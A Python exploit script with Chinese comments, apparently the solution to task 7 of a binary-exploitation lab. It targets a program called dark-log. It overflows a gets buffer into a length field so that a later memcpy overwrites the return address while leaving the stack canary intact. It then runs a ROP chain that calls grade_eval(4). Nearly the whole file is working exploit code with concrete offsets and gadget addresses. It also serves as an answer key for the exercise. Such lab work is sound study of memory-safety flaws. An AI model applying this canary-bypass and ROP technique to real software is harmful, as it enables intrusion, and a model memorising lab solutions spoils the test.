#!/usr/bin/env python3
"""任务7：绕过 Canary —— dark-log 开了 Stack Protector，用它自己的 memcpy
曲线救国，不碰 canary 就改掉返回地址，再 ROP 调用 grade_eval(4)。

dark-log 的 input 里（相对 rbp）：
    expression[128] @ rbp-0x120
    logMsg[128]     @ rbp-0xA0
    len (int)       @ rbp-0x20
    canary          @ rbp-0x8
    saved rbp       @ rbp+0
    return addr     @ rbp+8
代码是：gets(expression) 然后 memcpy(logMsg + len, expression, 128)。

绕过手法：
  - 直接用 gets 一路写到返回地址会覆盖 canary → 被 __stack_chk_fail 拦下。
  - 但我们可以只用 gets 溢出到 len（偏移 256，仍在 canary 之下，不碰 canary），
    把 len 设成 0xA8。这样 memcpy 的目的地 = logMsg + 0xA8 = rbp+8，正好是
    返回地址；它把 expression 的前 128 字节拷过去，覆盖返回地址但不动 canary。
  - canary 校验照常通过，leave/ret 跳到我们写在 expression 开头的 ROP 链。

ROP 链（和任务6 一样：设 rdi=4，对齐，跳 grade_eval；gadget 取自 dark-log）：
    pop rdi ; ret (0x4018a3) | 4 | ret (0x4018a4) | grade_eval (0x401677)
"""
import sys

POP_RDI    = 0x4018a3       # pop %rdi ; ret （csu 里错位解码得到）
RET        = 0x4018a4       # ret （对齐用）
GRADE_EVAL = 0x401677
LEN_VALUE  = 0xA8           # logMsg(rbp-0xA0) + 0xA8 = rbp+8 = 返回地址

def p64(x):
    return x.to_bytes(8, "little")

# 写进 expression 开头的 ROP 链，memcpy 会把它搬到返回地址处
rop  = p64(POP_RDI) + p64(4) + p64(RET) + p64(GRADE_EVAL)

expression = rop + b"A" * (128 - len(rop))     # 128 字节，前 32 字节是 ROP 链
logmsg     = b"B" * 128                          # 覆盖 logMsg，占位
length     = LEN_VALUE.to_bytes(4, "little")     # 覆盖 len = 0xA8

payload = expression + logmsg + length           # 共 260 字节，止于 len 之后（不碰 canary）

sys.stdout.buffer.write(payload)
